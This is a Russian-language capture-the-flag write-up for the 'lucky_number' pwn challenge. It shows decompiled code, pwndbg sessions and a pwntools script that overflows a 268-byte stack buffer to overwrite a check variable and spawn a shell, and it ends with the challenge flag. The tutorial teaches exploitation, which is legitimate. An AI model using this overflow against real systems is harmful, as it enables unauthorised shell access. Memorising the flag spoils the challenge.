# lucky_number

## Описание
> Добро пожаловать на ярмарку удивлений! Вы оказались перед огромным шаром Лотереи, блестящим и загадочным. Внутри шара множество билетов с разноцветными номерами, и слухи гласят, что самые удачливые люди могут выиграть невероятные призы.

Автор: [elicot](https://github.com/CornaElicottero)

nc localhost 2371

## Анализ файла
Проанализируем файл при помощи [онлайн декомпилятора](https://dogbolt.org/)

GHIDRA:
```c
#include "out.h"


int _init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  
  iVar1 = __gmon_start__();
  return iVar1; 
}

void FUN_00401020(void)

{
                    // WARNING: Treating indirect jump as call
  (*(code *)(undefined *)0x0)();
  return;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

int puts(char *__s)

{
  int iVar1;
  
  iVar1 = puts(__s);
  return iVar1;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

int system(char *__command)

{
  int iVar1;
  
  iVar1 = system(__command);
  return iVar1;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

int fflush(FILE *__stream)

{
  int iVar1;
  
  iVar1 = fflush(__stream);
  return iVar1;
}

void __isoc99_scanf(void)

{
  __isoc99_scanf();
  return;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

void exit(int __status)

{
                    // WARNING: Subroutine does not return
  exit(__status);
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

size_t fwrite(void *__ptr,size_t __size,size_t __n,FILE *__s)

{
  size_t sVar1;
  
  sVar1 = fwrite(__ptr,__size,__n,__s);
  return sVar1;
}

void processEntry _start(undefined8 param_1,undefined8 param_2)

{
  undefined auStack_8 [8];
  
  __libc_start_main(main,param_2,&stack0x00000008,__libc_csu_init,__libc_csu_fini,param_1,auStack_8)
  ;
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}

void _dl_relocate_static_pie(void)

{
  return;
}

// WARNING: Removing unreachable block (ram,0x004010dd)
// WARNING: Removing unreachable block (ram,0x004010e7)

void deregister_tm_clones(void)

{
  return;
}

// WARNING: Removing unreachable block (ram,0x0040111f)
// WARNING: Removing unreachable block (ram,0x00401129)

void register_tm_clones(void)

{
  return;
}

void __do_global_dtors_aux(void)

{
  if (completed_0 == '\0') {
    deregister_tm_clones();
    completed_0 = 1;
    return;
  }
  return;
}

// WARNING: Removing unreachable block (ram,0x0040111f)
// WARNING: Removing unreachable block (ram,0x00401129)

void frame_dummy(void)

{
  return;
}

void win(void)

{
  puts("Congratulations, you have passed the test of the Lottery Ball!");
  system("/bin/sh");
  return;
}

void main(void)

{
  undefined local_118 [268];
  int local_c;
  
  local_c = 0x13371337;
  puts("The Lottery Ball will grant access to the treasure chest if you bravely pass the challenge!"
      );
  fflush(stdout);
  fwrite("Enter your ticket number: ",1,0x1a,stdout);
  fflush(stdout);
  __isoc99_scanf(&DAT_004020c7,local_118);
  if (local_c == -0x21013713) {
    win();
    fflush(stdout);
  }
  else {
    puts("No luck for you today!");
    fflush(stdout);
  }
                    // WARNING: Subroutine does not return
  exit(0);
}

void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  
  _init(param_1);
  lVar1 = 0;
  do {
    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff,param_2,param_3)
    ;
    lVar1 = lVar1 + 1;
  } while (lVar1 != 1);
  return;
}

void __libc_csu_fini(void)

{
  return;
}

void _fini(void)

{
  return;
}
```

Здесь мы можем заметить две функции, которые нас интересуют `main` и `win`, где находится команда `system("/bin/sh")`, которая позволяет нам войти в консоль контейнера. Наша задача состоит в том, чтобы переполнить буфер и попасть в функцию win на сервере, чтобы войти в консоль сервера и там уже найти флаг.

Мы можем заметить что есть переменная `local_c`, с которой как раз и производится сравнение, которое если выполняется, вызывает функцию `win`. И она находится сразу после `local_118`, в которую мы вводим значение. Это позволит нам переполнить переменную `local_118`, и записать в переменную `local_c` значение из условия `-0x21013713 (0xdefec8ed)`, чтобы зайти в функцию win и при помощи консоли получить значение флага. Для этого нам надо узнать размер буффера у переменной `local_118`.

Воспользуемся плагином для gdb - [pwndbg](https://github.com/pwndbg/pwndbg), который наиболее удобен для анализа скомпилированных файлов и предоставляет больше информации.

Запустим плагин:

```
$gdb ./lucky_number
```

Теперь запустим наш скомпилированный файл:

```bash
pwndbg> start
Temporary breakpoint 1 at 0x401195

Temporary breakpoint 1, 0x0000000000401195 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x401191 (main) ◂— push rbp
 RBX  0x0
*RCX  0x7ffff7fa3718 (__exit_funcs) —▸ 0x7ffff7fa4e20 (initial) ◂— 0x0
*RDX  0x7fffffffe008 —▸ 0x7fffffffe367 ◂— 'SHELL=/bin/bash'
*RDI  0x1
*RSI  0x7fffffffdff8 —▸ 0x7fffffffe32b ◂— '/home/elicot/Downloads/surctf/pwn/lucky_number/lucky_number'
 R8   0x0
*R9   0x7ffff7fe21b0 (_dl_fini) ◂— push rbp
*R10  0x7
*R11  0x2
*R12  0x401090 (_start) ◂— xor ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
*RBP  0x7fffffffdf00 —▸ 0x401250 (__libc_csu_init) ◂— push r15
*RSP  0x7fffffffdf00 —▸ 0x401250 (__libc_csu_init) ◂— push r15
*RIP  0x401195 (main+4) ◂— sub rsp, 0x110
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x401195 <main+4>     sub    rsp, 0x110
   0x40119c <main+11>    mov    dword ptr [rbp - 4], 0x13371337
   0x4011a3 <main+18>    lea    rdi, [rip + 0xea6]
   0x4011aa <main+25>    call   puts@plt                      <puts@plt>
 
   0x4011af <main+30>    mov    rax, qword ptr [rip + 0x2ea2] <stdout@GLIBC_2.2.5>
   0x4011b6 <main+37>    mov    rdi, rax
   0x4011b9 <main+40>    call   fflush@plt                      <fflush@plt>
 
   0x4011be <main+45>    mov    rax, qword ptr [rip + 0x2e93] <stdout@GLIBC_2.2.5>
   0x4011c5 <main+52>    mov    rcx, rax
   0x4011c8 <main+55>    mov    edx, 0x1a
   0x4011cd <main+60>    mov    esi, 1
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdf00 —▸ 0x401250 (__libc_csu_init) ◂— push r15
01:0008│         0x7fffffffdf08 —▸ 0x7ffff7df8d0a (__libc_start_main+234) ◂— mov edi, eax
02:0010│         0x7fffffffdf10 —▸ 0x7fffffffdff8 —▸ 0x7fffffffe32b ◂— '/home/elicot/Downloads/surctf/pwn/lucky_number/lucky_number'
03:0018│         0x7fffffffdf18 ◂— 0x100000000
04:0020│         0x7fffffffdf20 —▸ 0x401191 (main) ◂— push rbp
05:0028│         0x7fffffffdf28 —▸ 0x7ffff7df87cf (init_cacheinfo+287) ◂— mov rbp, rax
06:0030│         0x7fffffffdf30 ◂— 0x0
07:0038│         0x7fffffffdf38 ◂— 0xa170cf15fa097ec5
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0         0x401195 main+4
   1   0x7ffff7df8d0a __libc_start_main+234
────────────────────────────────────────────────────────────────────────────────
```

Попробуем узнать offset(размер буффера), при котором происходит ошибка Segmentation fault. Сделаем это при помощи команды cyclic, которая сгенерирует нам строку из определенного количества символов(в нашем случае мы попробуем напримере 300 символов):

```bash
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
pwndbg> r
Starting program: /home/elicot/Downloads/surctf/pwn/lucky_number/lucky_number 
The Lottery Ball will grant access to the treasure chest if you bravely pass the challenge!
Enter your ticket number: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
No luck for you today!
[Inferior 1 (process 468019) exited normally]
```
Здесь мы можем заметить что наш ввод не вызвал нам нужную ошибку Segmentation fault. Это происходит потому что, переменная `local_118` у которой есть размер буффера переполняется, а переменная `local_c`, которая стоит за ней не имеет размера буффера и при любом вводе, программа отрабатывает без ошибок. Проанализируем код GHIDRA:

```c
void main(void)

{
  undefined local_118 [268];
  int local_c;
  
  local_c = 0x13371337;
  puts("The Lottery Ball will grant access to the treasure chest if you bravely pass the challenge!"
      );
  fflush(stdout);
  fwrite("Enter your ticket number: ",1,0x1a,stdout);
  fflush(stdout);
  __isoc99_scanf(&DAT_004020c7,local_118);
  if (local_c == -0x21013713) {
    win();
    fflush(stdout);
  }
  else {
    puts("No luck for you today!");
    fflush(stdout);
  }
                    // WARNING: Subroutine does not return
  exit(0);
}
```

Мы можем увидеть размер буффера прям в гидре у переменной `local_118` состовляет 268 байтов. Исходя из этого попробуем написать для переполнения буффера и перехода на нужную нам функцию. Будем использовать библиотеку [pwntools](https://github.com/Gallopsled/pwntools) для Python.

Вот сам скрипт:
```py
from pwn import *

io = process('./lucky_number')
# io = remote('localhost', 2371)
io.recvuntil(b'Enter your ticket number: ')
io.sendline(b'A'*268 + p64(0xdefec8ed))
print(io.interactive())
```

Здесь мы подключаемся сначала к файлу, чтобы проверить локально сможем ли мы получить флаг. `io.recvuntil(b'Enter your ticket number: ')` означает, что мы будем читать все что выводится консоль до момента когда нам предложат ввести значение. `io.sendline(b'A'*268 + p64(0xdefec8ed))` - эта строка как раз и является нашим payload. Здесь мы переполняем буфер 268 буквами "А" и после этого записываем в 64 битовую запись значение из условия, которая нам даст возможность перейти в функцию `win`. Запустим и проверим:

```bash
$python3 exploit.py 
[+] Starting local process './lucky_number': pid 470725
[*] Switching to interactive mode
Congratulations, you have passed the test of the Lottery Ball!
$ ls
docker-compose.yml  exploit.py    lucky_number  Makefile     WRITEUP.md
Dockerfile        flag    main.c          README.md
$ cat flag
```

Все хорошо, флаг выводится, теперь проверим на сервере (закомментим строку файлом и раскомментим строку с подключением по nc):

```bash
$python3 exploit.py 
[+] Opening connection to localhost on port 2371: Done
[*] Switching to interactive mode
$ ls
flag
lucky_number
$ cat flag
surctf_1ucky_l0tT3ry_Winn3r_2023$  
```

Отлично, флаг получен.

`flag: surctf_1ucky_l0tT3ry_Winn3r_2023`
